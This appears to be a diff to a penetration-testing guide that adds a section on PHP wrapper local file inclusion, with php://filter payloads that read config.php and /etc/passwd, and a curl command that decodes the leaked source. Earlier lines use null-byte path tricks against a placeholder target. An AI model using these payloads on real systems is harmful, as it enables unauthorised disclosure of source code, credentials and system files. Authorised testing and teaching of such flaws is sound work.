@@ -159,6 +159,22 @@ curl "https://target.com/ftp/files/acquisitions.md%2500"
 curl "https://target.com/ftp/legal.md%00"
 ```
 
+### Test 7 — PHP Wrapper LFI Source Disclosure
+
+When testing PHP applications, wrappers can be used to exfiltrate source code that would otherwise be executed by the server.
+
+**Example payloads:**
+```
+?file=php://filter/convert.base64-encode/resource=config.php
+?file=php://filter/convert.base64-encode/resource=../../../etc/passwd
+?file=php://filter/read=string.rot13/resource=index.php
+```
+
+**Decoding Base64 response:**
+```bash
+curl "https://target.com/page.php?file=php://filter/convert.base64-encode/resource=config.php" | base64 -d
+```
+
 ---
 
 ## Common Endpoints to Test
